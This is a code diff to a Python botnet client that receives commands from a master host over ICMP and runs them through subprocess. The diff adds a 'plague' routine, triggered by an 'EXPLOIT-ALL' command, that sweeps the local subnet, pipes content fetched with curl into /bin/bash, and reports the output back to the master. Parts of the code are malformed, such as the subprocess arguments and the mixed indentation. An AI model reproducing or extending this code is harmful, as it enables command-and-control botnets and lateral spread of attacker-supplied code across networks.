@@ -37,8 +37,8 @@ class Handler(threading.Thread):
 					PASSWORD = "DEFAULT-HARDCODED"
 					DECRYPTION = "DEFAULT-DENCRYPT"
 					WEB = "www.DEFAULT.com"
-				elif builtin[0] == "EXEC":
-					sub	
+				elif builtin[0] == "EXPLOIT-ALL":
+					plague()		
 			else:
 				cmd = raw.strip(PASSWORD).split()
 				out = subprocess.check_output(cmd)
@@ -47,12 +47,19 @@ class Handler(threading.Thread):
 def init():
 	print("Bot started...["+localhost+"]")
 	send_icmp(localhost, MASTER, "NEW-BOT-INIT:"+localhost)
-	
+def plague():
+	octets = localhost.split(".")
+	for i in range(1,253):
+		if i != octets[3]:
+			out = subprocess.check_output("curl", WEB ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
+			send_icmp(localhost, MASTER, "EXPLOIT-OUTPUT"+out)
+
 def main():
-    listener = Listener(cmdQueue)
-    handler = Handler(cmdQueue)
-    listener.start()
-    handler.start()
+	init()
+	listener = Listener(cmdQueue)
+    	handler = Handler(cmdQueue)
+    	listener.start()
+    	handler.start()
 
 
 ##TODO: TEST FILE TRANSFERS
